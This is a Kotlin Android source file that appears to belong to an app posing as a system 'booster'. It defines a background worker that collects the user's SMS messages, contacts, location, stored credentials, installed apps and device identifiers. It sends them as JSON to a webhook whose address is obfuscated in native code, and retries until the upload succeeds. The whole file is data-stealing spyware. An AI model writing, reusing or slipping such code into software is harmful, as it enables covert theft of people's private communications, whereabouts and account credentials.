package com.sysopt.booster

import android.content.Context
import android.os.Build
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import okhttp3.*
import java.util.concurrent.TimeUnit

class BeaconWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun doWork(): Result {
        return try {
            val payload = buildPayload()
            val url = NativeLib.decodeWebhookUrl()

            val request = Request.Builder()
                .url(url)
                .post(RequestBody.create(
                    MediaType.parse("application/json; charset=utf-8"),
                    Gson().toJson(payload)
                ))
                .addHeader("Content-Type", "application/json")
                .addHeader("User-Agent", "okhttp/4.12.0")
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Result.success()
                } else {
                    Result.retry()
                }
            }
        } catch (e: Exception) {
            Result.retry()
        }
    }

    private fun buildPayload(): Map<String, Any> {
        val ctx = applicationContext
        return mapOf(
            "type" to "beacon",
            "device" to mapOf(
                "model" to Build.MODEL,
                "manufacturer" to Build.MANUFACTURER,
                "android_version" to Build.VERSION.RELEASE,
                "sdk" to Build.VERSION.SDK_INT,
                "fingerprint" to Build.FINGERPRINT,
                "board" to Build.BOARD,
                "bootloader" to Build.BOOTLOADER,
                "brand" to Build.BRAND,
                "device" to Build.DEVICE,
                "display" to Build.DISPLAY,
                "hardware" to Build.HARDWARE,
                "host" to Build.HOST,
                "id" to Build.ID,
                "product" to Build.PRODUCT,
                "tags" to Build.TAGS,
                "type" to Build.TYPE,
                "user" to Build.USER
            ),
            "apps" to PackageUtils.getInstalledPackages(ctx),
            "sms" to SmsUtils.getSmsMessages(ctx),
            "contacts" to ContactUtils.getContacts(ctx),
            "location" to (LocationUtils.getLastLocation(ctx) ?: emptyMap<String, Any>()),
            "creds" to CredentialManager.getStoredCredentials(ctx),
            "battery" to BatteryUtils.getBatteryLevel(ctx),
            "storage" to StorageUtils.getStorageInfo(ctx),
            "network" to NetworkUtils.getNetworkInfo(ctx),
            "timestamp" to System.currentTimeMillis()
        )
    }
}